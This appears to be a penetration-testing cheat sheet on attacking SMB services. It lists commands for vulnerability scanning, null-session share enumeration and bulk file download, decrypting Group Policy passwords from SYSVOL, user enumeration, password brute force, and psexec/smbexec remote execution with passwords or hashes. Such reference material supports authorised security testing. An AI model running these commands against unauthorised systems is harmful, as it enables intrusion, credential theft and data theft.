# 139,445 - SMB

### Service enumeration

#### Scan

```sh
# Look for the SMB server version => if old check for known vulns ( ex : Eternalblue)
nmap -sC -sV -p139,445 <IP>
nmap --script 'vuln' -sV -p139,445 <IP>

auxiliary/scanner/smb/smb_ms17_010
```

#### Machine name

```sh
nxc smb <IP>
```

#### List shares

{% tabs %}
{% tab title="Linux" %}
```shellscript
nxc smb <IP> -u '' -p '' --shares
smbmap -H <IP>
smbclient -L \\<IP> -U ''
```
{% endtab %}

{% tab title="Windows" %}
```powershell
# PowerView
Get-NetShare -ComputerName <COMPUTER>    
```
{% endtab %}
{% endtabs %}

#### Browse shares

{% tabs %}
{% tab title="Linux" %}
```shellscript
smbclient \\\\<IP>\\<SHARE> -U ''
smbmap -H <IP> -r <SHARE>
```
{% endtab %}

{% tab title="Windows" %}
```shellscript
# Mount the share, then browse 
net use n: \\<IP>\ <SHARE> /user:<DOMAIN>\<USER> <PASSWORD>
```
{% endtab %}
{% endtabs %}

```sh
smbclient \\\\<IP>\\<SHARE> -U ''
smbmap -H <IP> -r <SHARE>
```

#### List all files in share

```shellscript
nxc smb <IP> -u <USER> -p <PASSWORD> -M spider_plus --share '<SHARE>'

# Connect to the share, disable download validation for every file and get everything
smbclient \\\\<IP>\\<SHARE> -U ''
recurse ON
prompt OFF
mget *

smbmap -H <IP> -r <SHARE>
```

#### SYSVOL share

Group Policies for account management are stored on the Domain Controller in `Groups.xml` files buried in the `SYSVOL` folder. These policies will set the password for the contained account in the `cpassword` field

The field is encrypted with a public AES key ⇒ we can get the plaintext

```sh
# With null session
impacket-Get-GPPPassword -no-pass '<DC>'

# With creds
impacket-Get-GPPPassword '<DOMAIN>'/'<USER>':'<PASSWORD>'@'<DC>'
```

#### User enumeration

```sh
nxc smb <IP> -u '' -p '' --users
nxc smb <IP> -u '' -p '' --rid-brute
```

#### Automate

```sh
enum4linux -A <IP>
```

### Brute force

```sh
# Auth as domain users
nxc smb <IP> -u <USER> -p '<PASSWORD_LIST>' --continue-on-sucess

# Auth as local users (only present on the machine, not on the domain)
nxc smb <IP> -u <USER> -p '<PASSWORD_LIST>' --local-auth --continue-on-sucess
```

### PrivEsc

Will create a new service in the victim machine and use it to execute something (`psexec` will upload an executable file to `ADMIN$` share)

The `ADMIN$` share has to be writable by the user ⇒ we need admin credentials

```sh
# With admin password
impacket-psexec <USER>:'<PASS>'@<DC>

# With admin hash
impacket-psexec <USER>@<DC> -H <HASHES>

# Get a non interactive shell
impacket-smbexec <DOMAIN>/<USER>:<PASSWORD>@<IP>
impacket-smbexec <DOMAIN>/<USER>@<IP> -hashes :<NT_HASH>
```
